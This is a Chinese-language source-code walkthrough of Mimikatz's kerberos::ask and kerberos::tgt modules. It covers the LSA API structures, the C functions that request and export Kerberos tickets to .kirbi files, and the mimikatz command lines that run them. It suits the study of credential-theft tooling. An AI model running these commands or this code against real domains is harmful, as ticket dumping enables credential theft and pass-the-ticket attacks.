Mimikatz Explorer - Kerberos Ask
================================

Mimikatz 的 `kerberos::ask` 功能可以为当前用户会话请求新的 Kerberos 服务票据。`kerberos::tgt` 功能可以从当前用户会话中检索票据授予票据。

TL;DR
=====

KERB\_RETRIEVE\_TKT\_REQUEST
----------------------------

[KERB\_RETRIEVE\_TKT\_REQUEST](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ns-ntsecapi-kerb_retrieve_tkt_request) 结构包含用于检索票证的信息。

该结构语法如下：

```cpp
typedef struct _KERB_RETRIEVE_TKT_REQUEST {
  KERB_PROTOCOL_MESSAGE_TYPE MessageType;
  LUID                       LogonId;
  UNICODE_STRING             TargetName;
  ULONG                      TicketFlags;
  ULONG                      CacheOptions;
  LONG                       EncryptionType;
  SecHandle                  CredentialsHandle;
} KERB_RETRIEVE_TKT_REQUEST, *PKERB_RETRIEVE_TKT_REQUEST;
```

- MessageType：KERB\_PROTOCOL\_MESSAGE\_TYPE 值，指示正在发出请求的类型。此成员必须设置为 KerbRetrieveEncodedTicketMessage 或 KerbRetrieveTicketMessage。
- LogonId：包含登录会话标识符的 LUID 结构。
- TargetName：包含目标服务名称的 UNICODE\_STRING。
- TicketFlags：包含指定检索票证用途的标志。
- CacheOptions：指示用于搜索缓存的选项。将此成员设置为零，以指示应在缓存中搜索缓存；如果未找到票证，则应请求新票证。CacheOptions 可以包含以下值。

| Value | 含义 |
|---|---|
| KERB\_RETRIEVE\_TICKET\_DONT\_USE\_CACHE (1) | 始终请求新票证，不要搜索缓存。 |
| KERB\_RETRIEVE\_TICKET\_USE\_CREDHANDLE (4) | 使用 CredentialsHandle 成员而不是 LogonId 标识登录会话。 |
| KERB\_RETRIEVE\_TICKET\_USE\_CACHE\_ONLY (2) | 仅返回以前缓存的票证。 |
| KERB\_RETRIEVE\_TICKET\_AS\_KERB\_CRED (8) | 以 Kerberos 凭据（KERB\_CRED）的形式返回票证，用于凭据的转储。 |
| KERB\_RETRIEVE\_TICKET\_WITH\_SEC\_CRED (10) | 未实现。 |
| KERB\_RETRIEVE\_TICKET\_CACHE\_TICKET (20) | 返回当前位于缓存中的票证。如果票证不在缓存中，则请求并缓存该票证。 |
| KERB\_RETRIEVE\_TICKET\_MAX\_LIFETIME (40) | 返回策略允许的最大时间的新票证。 |

- EncryptionType：指定要用于请求票证的加密类型。
- CredentialsHandle：用于代替登录会话标识符的 SSPI 凭据句柄。

KerbRetrieveEncodedTicketMessage 消息从缓存中检索指定的票证（如果它已经存在），或者通过从 Kerberos 密钥分发中心 (KDC) 请求它来检索。

KerbRetrieveTicketMessage 调度例程从指定用户登录会话的票证缓存中检索票证授予票证。

KERB\_RETRIEVE\_TKT\_RESPONSE
-----------------------------

[KERB\_RETRIEVE\_TKT\_RESPONSE](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ns-ntsecapi-kerb_retrieve_tkt_response) 结构包含从 KERB\_RETRIEVE\_TKT\_REQUEST 结构构造的请求中检索票证的响应。

该结构语法如下：

```cpp
typedef struct _KERB_RETRIEVE_TKT_RESPONSE {
  KERB_EXTERNAL_TICKET Ticket;
} KERB_RETRIEVE_TKT_RESPONSE, *PKERB_RETRIEVE_TKT_RESPONSE;
```

- Ticket：包含所请求票证的 KERB\_EXTERNAL\_TICKET 结构。[KERB\_EXTERNAL\_TICKET](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ns-ntsecapi-kerb_external_ticket) 结构包含有关外部票证的信息，外部票证是导出给外部用户的 Kerberos 票证，其语法如下。

```cpp
typedef struct _KERB_EXTERNAL_TICKET {
  PKERB_EXTERNAL_NAME ServiceName;
  PKERB_EXTERNAL_NAME TargetName;
  PKERB_EXTERNAL_NAME ClientName;
  UNICODE_STRING      DomainName;
  UNICODE_STRING      TargetDomainName;
  UNICODE_STRING      AltTargetDomainName;
  KERB_CRYPTO_KEY     SessionKey;
  ULONG               TicketFlags;
  ULONG               Flags;
  LARGE_INTEGER       KeyExpirationTime;
  LARGE_INTEGER       StartTime;
  LARGE_INTEGER       EndTime;
  LARGE_INTEGER       RenewUntil;
  LARGE_INTEGER       TimeSkew;
  ULONG               EncodedTicketSize;
  PUCHAR              EncodedTicket;
} KERB_EXTERNAL_TICKET, *PKERB_EXTERNAL_TICKET;
```

- ServiceName：KERB\_EXTERNAL\_NAME 结构，包含多部分、规范、返回的服务名称。
- TargetName：包含多部分服务主体名称（SPN）的 KERB\_EXTERNAL\_NAME 结构。
- ClientName：票证中包含客户端名称的 KERB\_EXTERNAL\_NAME 结构。此名称是相对于当前域的。
- DomainName：包含与 ServiceName 成员对应的域名称的 UNICODE\_STRING。这是签发票证的域。
- TargetDomainName：一个 UNICODE\_STRING，其中包含票证有效的域的名称。对于域间票证，这是目标域。
- AltTargetDomainName：包含目标域同义词的 UNICODE\_STRING。每个域都有两个名称：DNS 名称和 NetBIOS 名称。
- SessionKey：包含票证会话密钥的 KERB\_CRYPTO\_KEY 结构。
- TicketFlags：票证标志，如 Internet RFC 4120 中所定义。此参数可以是以下一个或多个值。
- Flags：保留以供将来使用。将此成员设置为零。
- KeyExpirationTime：包含密钥过期时间的 FILETIME 结构。
- StartTime：包含票证生效时间的 FILETIME 结构。
- EndTime：包含票证到期时间的 FILETIME 结构。
- RenewUntil：一个 FILETIME 结构，其中包含可以更新票证的最晚时间。在此时间之后发送的续订请求将被拒绝。
- TimeSkew：一个 FILETIME 结构，它包含发出票证的计算机上的当前时间与将使用票证的计算机上的当前时间之间的测量时间差。
- EncodedTicketSize：编码票证的大小（以字节为单位）。
- EncodedTicket：包含 ASN.1 编码票证的缓冲区。

其中，KERB\_EXTERNAL\_TICKET 结构中的 EncodedTicket 成员包含票据的二进制数据，该数据可以保存到文件中，也可以通过 Base64 编码后打印出来。

Main Detail
===========

Kerberos::ask
-------------

Mimikatz 的 `kerberos::ask` 通过 LsaCallAuthenticationPackage 函数发送 KERB\_RETRIEVE\_TKT\_REQUEST 消息，为当前用户会话请求新的 Kerberos 服务票据。响应的新票据将保存到 PKERB\_RETRIEVE\_TKT\_RESPONSE 结构中。

根据 `ask` 功能的名称找到其入口函数 kuhl\_m\_kerberos\_ask：

- kerberos\\kuhl\_m\_kerberos.c

```cpp
NTSTATUS kuhl_m_kerberos_ask(int argc, wchar_t* argv[])
{
    NTSTATUS status, packageStatus;
    PWCHAR filename = NULL, ticketname = NULL;
    PCWCHAR szTarget;
    PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
    PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
    KIWI_KERBEROS_TICKET ticket = { 0 };
    DWORD szData;
    USHORT dwTarget;
    BOOL isExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL), isTkt = kull_m_string_args_byName(argc, argv, L"tkt", NULL, NULL), isNoCache = kull_m_string_args_byName(argc, argv, L"nocache", NULL, NULL);

    if (kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL))
    {
        dwTarget = (USHORT)((wcslen(szTarget) + 1) * sizeof(wchar_t));

        szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
        if (pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, szData))
        {
            pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
            pKerbRetrieveRequest->CacheOptions = isNoCache ? KERB_RETRIEVE_TICKET_DONT_USE_CACHE : KERB_RETRIEVE_TICKET_DEFAULT;
            pKerbRetrieveRequest->EncryptionType = kull_m_string_args_byName(argc, argv, L"rc4", NULL, NULL) ? KERB_ETYPE_RC4_HMAC_NT : kull_m_string_args_byName(argc, argv, L"des", NULL, NULL) ? KERB_ETYPE_DES3_CBC_MD5 : kull_m_string_args_byName(argc, argv, L"aes256", NULL, NULL) ? KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 : kull_m_string_args_byName(argc, argv, L"aes128", NULL, NULL) ? KERB_ETYPE_AES128_CTS_HMAC_SHA1_96 : KERB_ETYPE_DEFAULT;
            pKerbRetrieveRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
            pKerbRetrieveRequest->TargetName.MaximumLength = dwTarget;
            pKerbRetrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
            RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, szTarget, pKerbRetrieveRequest->TargetName.MaximumLength);
            kprintf(L"Asking for: %wZ\n", &pKerbRetrieveRequest->TargetName);

            status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData, &packageStatus);
            if (NT_SUCCESS(status))
            {
                if (NT_SUCCESS(packageStatus))
                {
                    ticket.ServiceName = pKerbRetrieveResponse->Ticket.ServiceName;
                    ticket.DomainName = pKerbRetrieveResponse->Ticket.DomainName;
                    ticket.TargetName = pKerbRetrieveResponse->Ticket.TargetName;
                    ticket.TargetDomainName = pKerbRetrieveResponse->Ticket.TargetDomainName;
                    ticket.ClientName = pKerbRetrieveResponse->Ticket.ClientName;
                    ticket.AltTargetDomainName = pKerbRetrieveResponse->Ticket.AltTargetDomainName;

                    ticket.StartTime = *(PFILETIME)&pKerbRetrieveResponse->Ticket.StartTime;
                    ticket.EndTime = *(PFILETIME)&pKerbRetrieveResponse->Ticket.EndTime;
                    ticket.RenewUntil = *(PFILETIME)&pKerbRetrieveResponse->Ticket.RenewUntil;

                    ticket.KeyType = ticket.TicketEncType = pKerbRetrieveResponse->Ticket.SessionKey.KeyType;
                    ticket.Key.Length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
                    ticket.Key.Value = pKerbRetrieveResponse->Ticket.SessionKey.Value;

                    ticket.TicketFlags = pKerbRetrieveResponse->Ticket.TicketFlags;
                    ticket.Ticket.Length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
                    ticket.Ticket.Value = pKerbRetrieveResponse->Ticket.EncodedTicket;

                    kprintf(L"   * Ticket Encryption Type & kvno not representative at screen\n");
                    if (isNoCache && isExport)
                        kprintf(L"   * NoCache: exported ticket may vary with informations at screen\n");
                    kuhl_m_kerberos_ticket_display(&ticket, TRUE, FALSE);
                    kprintf(L"\n");

                    if (isTkt)
                        if (ticketname = kuhl_m_kerberos_generateFileName_short(&ticket, L"tkt"))
                        {
                            if (kull_m_file_writeData(ticketname, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
                                kprintf(L"\n   * TKT to file       : %s", ticketname);
                            else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
                            LocalFree(ticketname);
                        }
                    if (isExport)
                        filename = kuhl_m_kerberos_generateFileName_short(&ticket, MIMIKATZ_KERBEROS_EXT);

                    LsaFreeReturnBuffer(pKerbRetrieveResponse);

                    if (isExport)
                    {
                        pKerbRetrieveRequest->CacheOptions |= KERB_RETRIEVE_TICKET_AS_KERB_CRED;
                        status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData, &packageStatus);
                        if (NT_SUCCESS(status))
                        {
                            if (NT_SUCCESS(packageStatus))
                            {
                                if (kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
                                    kprintf(L"\n   * KiRBi to file     : %s", filename);
                                else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
                                LsaFreeReturnBuffer(pKerbRetrieveResponse);
                            }
                            else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
                        }
                        else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);
                    }
                    if (filename)
                        LocalFree(filename);
                }
                else if (packageStatus == STATUS_NO_TRUST_SAM_ACCOUNT)
                    PRINT_ERROR(L"\'%wZ\' Kerberos name not found!\n", &pKerbRetrieveRequest->TargetName);
                else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
            }
            else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);

            LocalFree(pKerbRetrieveRequest);
        }
    }
    else PRINT_ERROR(L"At least /target argument is required (eg: /target:cifs/server.lab.local)\n");
    return STATUS_SUCCESS;
}
```

该函数首先声明了一个 KERB\_RETRIEVE\_TKT\_REQUEST 结构体的指针 pKerbRetrieveRequest，用于发送 KerbRetrieveEncodedTicketMessage 消息。此外，还声明了 KERB\_RETRIEVE\_TKT\_RESPONSE 结构体的指针 pKerbRetrieveResponse，用于接受请求到的新票据。

然后通过 kull\_m\_string\_args\_byName 函数获取了一些命令行参数。

### Request and Accept Tickets

在发送 KERB\_RETRIEVE\_TKT\_REQUEST 请求消息之前，需要先扩展一下 pKerbRetrieveRequest 的大小，如下所示。

```cpp
szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
if (pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, szData))
{
    // ...
}
```

这里将 pKerbRetrieveRequest 的大小在原来 `sizeof(KERB_RETRIEVE_TKT_REQUEST)` 大小的基础上加了 dwTarget，为的是将新票据的 dwTarget 设置到 KERB\_RETRIEVE\_TKT\_REQUEST 结构体的 TargetName 成员中。dwTarget 为 szTarget 的大小，szTarget 是从命令行参数中获取到的目标服务主体名称。

然后开始设置 pKerbRetrieveRequest 的成员值，如下所示。

```cpp
pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
pKerbRetrieveRequest->CacheOptions = isNoCache ? KERB_RETRIEVE_TICKET_DONT_USE_CACHE : KERB_RETRIEVE_TICKET_DEFAULT;
pKerbRetrieveRequest->EncryptionType = kull_m_string_args_byName(argc, argv, L"rc4", NULL, NULL) ? KERB_ETYPE_RC4_HMAC_NT : kull_m_string_args_byName(argc, argv, L"des", NULL, NULL) ? KERB_ETYPE_DES3_CBC_MD5 : kull_m_string_args_byName(argc, argv, L"aes256", NULL, NULL) ? KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 : kull_m_string_args_byName(argc, argv, L"aes128", NULL, NULL) ? KERB_ETYPE_AES128_CTS_HMAC_SHA1_96 : KERB_ETYPE_DEFAULT;
pKerbRetrieveRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
pKerbRetrieveRequest->TargetName.MaximumLength = dwTarget;
pKerbRetrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, szTarget, pKerbRetrieveRequest->TargetName.MaximumLength);
```

可以看到，由于 isNoCache 默认为 NULL，因此这里的 CacheOptions 设置了 KERB\_RETRIEVE\_TICKET\_DEFAULT 标志。此外，票据的加密类型 EncryptionType 可以从命令行参数中获取。

构造完 KERB\_RETRIEVE\_TKT\_REQUEST 结构后，调用 LsaCallKerberosPackage 函数发送 KerbRetrieveEncodedTicketMessage 消息。请求到的新票据将保存到 pKerbRetrieveResponse 中，如下所示。

```cpp
status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData, &packageStatus);
```

如果一切顺利，则将 pKerbRetrieveResponse中的票据信息添加到变量 ticket 中，如下所示。

```cpp
ticket.ServiceName = pKerbRetrieveResponse->Ticket.ServiceName;
ticket.DomainName = pKerbRetrieveResponse->Ticket.DomainName;
ticket.TargetName = pKerbRetrieveResponse->Ticket.TargetName;
ticket.TargetDomainName = pKerbRetrieveResponse->Ticket.TargetDomainName;
ticket.ClientName = pKerbRetrieveResponse->Ticket.ClientName;
ticket.AltTargetDomainName = pKerbRetrieveResponse->Ticket.AltTargetDomainName;

ticket.StartTime = *(PFILETIME)&pKerbRetrieveResponse->Ticket.StartTime;
ticket.EndTime = *(PFILETIME)&pKerbRetrieveResponse->Ticket.EndTime;
ticket.RenewUntil = *(PFILETIME)&pKerbRetrieveResponse->Ticket.RenewUntil;

ticket.KeyType = ticket.TicketEncType = pKerbRetrieveResponse->Ticket.SessionKey.KeyType;
ticket.Key.Length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
ticket.Key.Value = pKerbRetrieveResponse->Ticket.SessionKey.Value;

ticket.TicketFlags = pKerbRetrieveResponse->Ticket.TicketFlags;
ticket.Ticket.Length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
ticket.Ticket.Value = pKerbRetrieveResponse->Ticket.EncodedTicket;
```

ticket 是一个自定义的 KIWI\_KERBEROS\_TICKET 结构体，用于临时存储票据信息，其定义如下。

```cpp
typedef struct _KIWI_KERBEROS_TICKET {
    PKERB_EXTERNAL_NAME ServiceName;
    LSA_UNICODE_STRING  DomainName;
    PKERB_EXTERNAL_NAME TargetName;
    LSA_UNICODE_STRING  TargetDomainName;
    PKERB_EXTERNAL_NAME ClientName;
    LSA_UNICODE_STRING  AltTargetDomainName;

    LSA_UNICODE_STRING  Description;

    FILETIME    StartTime;
    FILETIME    EndTime;
    FILETIME    RenewUntil;

    LONG        KeyType;
    KIWI_KERBEROS_BUFFER    Key;

    ULONG       TicketFlags;
    LONG        TicketEncType;
    ULONG       TicketKvno;
    KIWI_KERBEROS_BUFFER    Ticket;
} KIWI_KERBEROS_TICKET, *PKIWI_KERBEROS_TICKET;
```

至此，成功为当前用户申请到了新的服务票据，新票据将自动缓存在内存中。

以申请 DC01 上的 LDAP 服务的票据为例进行演示，其最终执行效果如下所示：

```php
mimikatz.exe "kerberos::ask /target:ldap/dc01.pentest.com" exit
```

![image-20230511154332299](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-d4e31c490cbac9387fa1b6efa63243f6238d91c1.png)

### Export Tickets to File

如果指定了 `/export` 选项，则将请求到的票据转储为文件。由于申请到的票据将自动缓存在内存中，因此需要重新调用一次 LsaCallKerberosPackage 函数，重内存中检索这个新票据。最后通过 kull\_m\_file\_writeData 函数将检索到的新票据写入文件，如下所示。

```cpp
if (isExport)
{
    pKerbRetrieveRequest->CacheOptions |= KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData, &packageStatus);
    if (NT_SUCCESS(status))
    {
        if (NT_SUCCESS(packageStatus))
        {
            if (kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
                kprintf(L"\n   * KiRBi to file     : %s", filename);
            else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
            LsaFreeReturnBuffer(pKerbRetrieveResponse);
        }
        else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
    }
    else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);
}
```

这里为 CacheOptions 设置了 KERB\_RETRIEVE\_TICKET\_AS\_KERB\_CRED 标志，用于以 Kerberos 凭据（KERB\_CRED）的形式返回票证。返回的票据被保存在 pKerbRetrieveResponse 指向的内存中。

接着，对保存在 pKerbRetrieveResponse 中的票据调用 kull\_m\_file\_writeData 函数，该函数定义如下。

```cpp
BOOL kull_m_file_writeData(PCWCHAR fileName, LPCVOID data, DWORD lenght)
{
    BOOL reussite = FALSE;
    DWORD dwBytesWritten = 0, i;
    HANDLE hFile = NULL;
    LPWSTR base64;

    if(isBase64InterceptOutput)
    {
        if(CryptBinaryToString((const BYTE *) data, lenght, CRYPT_STRING_BASE64, NULL, &dwBytesWritten))
        {
            if(base64 = (LPWSTR) LocalAlloc(LPTR, dwBytesWritten * sizeof(wchar_t)))
            {
                if(reussite = CryptBinaryToString((const BYTE *) data, lenght, CRYPT_STRING_BASE64, base64, &dwBytesWritten))
                {
                    kprintf(L"\n====================\nBase64 of file : %s\n====================\n", fileName);
                    for(i = 0; i < dwBytesWritten; i++)
                        kprintf(L"%c", base64[i]);
                    kprintf(L"====================\n");
                }
                LocalFree(base64);
            }
        }
    }
    else if((hFile = CreateFile(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL)) && hFile != INVALID_HANDLE_VALUE)
    {
        if(WriteFile(hFile, data, lenght, &dwBytesWritten, NULL) && (lenght == dwBytesWritten))
            reussite = FlushFileBuffers(hFile);
        CloseHandle(hFile);
    }
    return reussite;
}
```

这里，如果 isBase64InterceptOutput 为 TRUE，则通过 CryptBinaryToString 函数将票据数据转换为 Base64 编码后的字符串并打印出来。但是 isBase64InterceptOutput 默认为 FALSE，因此会调用 WriteFile 函数将票据数据写入文件。

最终执行效果如下：

```cmd
mimikatz.exe "kerberos::list /export" exit
```

![image-20230511160303887](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-1b298eb9615349af4d70bea579df046310b43faa.png)

Kerberos::tgt
-------------

Mimikatz 的 `kerberos::tgt` 功能可以从当前用户会话中检索票据授予票据。

根据 `ask` 功能的名称找到其入口函数 kuhl\_m\_kerberos\_tgt：

- kerberos\\kuhl\_m\_kerberos.c

```cpp
NTSTATUS kuhl_m_kerberos_tgt(int argc, wchar_t* argv[])
{
    NTSTATUS status, packageStatus;
    KERB_RETRIEVE_TKT_REQUEST kerbRetrieveRequest = { KerbRetrieveTicketMessage, {0, 0}, {0, 0, NULL}, 0, 0, KERB_ETYPE_NULL, {0, 0} };
    PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
    DWORD szData;
    KIWI_KERBEROS_TICKET kiwiTicket = { 0 };
    DWORD i;
    BOOL isNull = FALSE;

    status = LsaCallKerberosPackage(&kerbRetrieveRequest, sizeof(KERB_RETRIEVE_TKT_REQUEST), (PVOID*)&pKerbRetrieveResponse, &szData, &packageStatus);
    kprintf(L"Kerberos TGT of current session : ");
    if (NT_SUCCESS(status))
    {
        if (NT_SUCCESS(packageStatus))
        {
            kiwiTicket.ServiceName = pKerbRetrieveResponse->Ticket.ServiceName;
            kiwiTicket.TargetName = pKerbRetrieveResponse->Ticket.TargetName;
            kiwiTicket.ClientName = pKerbRetrieveResponse->Ticket.ClientName;
            kiwiTicket.DomainName = pKerbRetrieveResponse->Ticket.DomainName;
            kiwiTicket.TargetDomainName = pKerbRetrieveResponse->Ticket.TargetDomainName;
            kiwiTicket.AltTargetDomainName = pKerbRetrieveResponse->Ticket.AltTargetDomainName;
            kiwiTicket.TicketFlags = pKerbRetrieveResponse->Ticket.TicketFlags;
            kiwiTicket.KeyType = kiwiTicket.TicketEncType = pKerbRetrieveResponse->Ticket.SessionKey.KeyType; // TicketEncType not in response
            kiwiTicket.Key.Length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
            kiwiTicket.Key.Value = pKerbRetrieveResponse->Ticket.SessionKey.Value;
            kiwiTicket.StartTime = *(PFILETIME)&pKerbRetrieveResponse->Ticket.StartTime;
            kiwiTicket.EndTime = *(PFILETIME)&pKerbRetrieveResponse->Ticket.EndTime;
            kiwiTicket.RenewUntil = *(PFILETIME)&pKerbRetrieveResponse->Ticket.RenewUntil;
            kiwiTicket.Ticket.Length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
            kiwiTicket.Ticket.Value = pKerbRetrieveResponse->Ticket.EncodedTicket;
            kuhl_m_kerberos_ticket_display(&kiwiTicket, TRUE, FALSE);

            for (i = 0; !isNull && (i < kiwiTicket.Key.Length); i++) // a revoir
                isNull |= !kiwiTicket.Key.Value[i];
            if (isNull)
                kprintf(L"\n\n\t** Session key is NULL! It means allowtgtsessionkey is not set to 1 **\n");

            LsaFreeReturnBuffer(pKerbRetrieveResponse);
        }
        else if (packageStatus == SEC_E_NO_CREDENTIALS)
            kprintf(L"no ticket !\n");
        else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveTicketMessage / Package : %08x\n", packageStatus);
    }
    else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveTicketMessage : %08x\n", status);

    return STATUS_SUCCESS;
}
```

可以看到，该函数首先定义一个 KERB\_RETRIEVE\_TKT\_REQUEST 结构变量 kerbRetrieveRequest，并将成员 MessageType 设为 KerbRetrieveTicketMessage。

然后通过 LsaCallKerberosPackage 发送 KerbRetrieveTicketMessage 消息为当前用户会话检索 TGT 票据，并将返回的 TGT 保存到 pKerbRetrieveResponse 中。

最后将检索到的新的 TGT 信息保存在 kiwiTicket 中。kiwiTicket 同样是一个自定义的 KIWI\_KERBEROS\_TICKET 结构体，用于临时存储票据信息。

最终的执行效果如下：

```cpp
mimikatz.exe "kerberos::tgt" exit
```

![image-20230511163244010](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-9f8832d8c16695d6fd2083b2b4591c82155647b0.png)